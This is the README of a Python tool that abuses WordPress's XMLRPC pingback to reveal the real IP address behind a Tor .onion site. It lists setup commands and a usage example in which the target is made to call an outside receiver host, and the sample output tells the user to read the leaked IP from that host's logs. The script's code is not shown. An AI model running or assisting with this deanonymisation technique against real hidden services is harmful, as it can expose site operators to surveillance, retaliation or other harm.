# Tor WordPress XMLRPC IP Leaker
This is a Python script for using the WordPress XMLRPC pingback function to leak an IP address from a Tor domain

## Requirements
- Working Tor SOCKS5 proxy (socks5h://localhost:9050)
- Public domain/IP which you can send requests to

## Setup
```bash
$ pip3 install virtualenv
$ virtualenv -p python3 .venv
$ source .venv/bin/activate
$ pip3 install -r requirements.txt
$ python3 wp_xmlrpc_leak.py -h
```

## Usage
```bash
$ python3 wp_xmlrpc_leak.py --host="http://wordpress_target.onion/" --pingback="http://leaked_ip_receiver.com"
Tor WordPress XMLRPC IP Leaker
[•] Made by: https://github.com/joshuavanderpoll/Tor-Wordpress-IP-Leaker
[@] Trying to get a blog post to use for pingback request...
[@] Trying HTML body method...
[√] Retrieved post link from HTML.
[√] Using post http://wordpress_target.onion/?p=1...
[√] Sent XMLRPC pingback request to http://leaked_ip_receiver.com/wordpress_target.onion.
[√] Received success response from XMLRPC request.

[√] Check your receiver's host its request/access logs to see the target it's IP.

```